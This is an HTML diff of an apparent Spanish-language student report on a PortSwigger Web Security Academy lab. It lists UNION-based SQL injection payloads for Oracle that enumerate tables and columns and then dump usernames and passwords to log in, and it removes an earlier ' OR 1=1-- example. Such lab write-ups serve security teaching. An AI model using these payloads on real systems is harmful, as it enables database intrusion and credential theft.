@@ -139,38 +139,37 @@
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p style="font-size:21px; font-weight:bold;">Técnica Aplicada</p>
-            <p class="parrafo">Al enviar el payload <code>' OR 1=1--</code> en el parámetro de la URL, somos capaces de
-                interferir con la estructura de la consulta original, la cual generalmente tiene este aspecto:</p>
-            <pre
-                style="background:#eee; padding:15px; border-radius:4px; font-size:16px;">SELECT * FROM products WHERE category = '[input_usuario]' AND released = 1</pre>
-            <p class="parrafo">El payload altera la lógica resultando en:</p>
-            <pre
-                style="background:#eee; padding:15px; border-radius:4px; font-size:16px;">SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1</pre>
+            <p class='parrafo'>En lugar de information_schema, bases de datos como Oracle exponen esta informaci�n en tablas del sistema propietario como <code>all_tables</code> y <code>all_tab_columns</code>.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Extraer los nombres de las tablas: <code>'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>. Identificamos <code>USERS_XYZ</code>.</p><p class='parrafo'>2. Extraer columnas de la tabla identificada: <code>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ'--</code>. Identificamos <code>USERNAME_1</code> y <code>PASSWORD_2</code>.</p><p class='parrafo'>3. Volcamos la informaci�n usando las variables aleatorizadas: <code>'+UNION+SELECT+USERNAME_1,+PASSWORD_2+FROM+USERS_XYZ--</code> y conseguimos logearnos.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicaci�n</p><p class='parrafo'>Este proceso subraya que aunque Oracle esconde metadatos en tablas diferentes (usualmente precedidas con <code>all_</code> o <code>user_</code>), el proceso para cartografiar la base y el objetivo sigue exactamente la misma l�gica constructora iterativa.</p>
+        </div>
+
+        <div class="section">
+            <h3 class="section-title">Contenido Multimedia</h3>
+        </div>
+        <div class="content-area" style="text-align: center;">
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaci�n de prueba.</p>
+            <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
+                [Espacio reservado para captura de pantalla del usuario]
+            </div>
         </div>
 
         <div class="section">
             <h3 class="section-title">Reflexiones del Alumno</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">Al comprender cómo las bases de datos interpretan la sentencia lógica <code>OR 1=1</code>
-                como matemáticamente verdadera, es fácil deducir por qué devuelven todos los registros almacenados
-                (incluso aquellos normalmente ocultos u obsoletos). Esta resolución evidencia la necesidad crítica de
-                parametrizar cualquier entrada controlada por el usuario.</p>
+            <p class="parrafo">[Espacio para las reflexiones del alumno]</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Referencias Técnicas</h3>
         </div>
         <div class="content-area">
-            <p class="citas" style="font-size: 16px;">PortSwigger. (n.d.). <i>SQL injection vulnerability in WHERE
-                    clause allowing retrieval of hidden data</i>. Web Security Academy. Recuperado de
-                https://portswigger.net/</p>
+            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>SQL injection attack, listing the database contents on Oracle</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
         </div>
     </div>
 </body>
 
 </html>
+
 
 
 
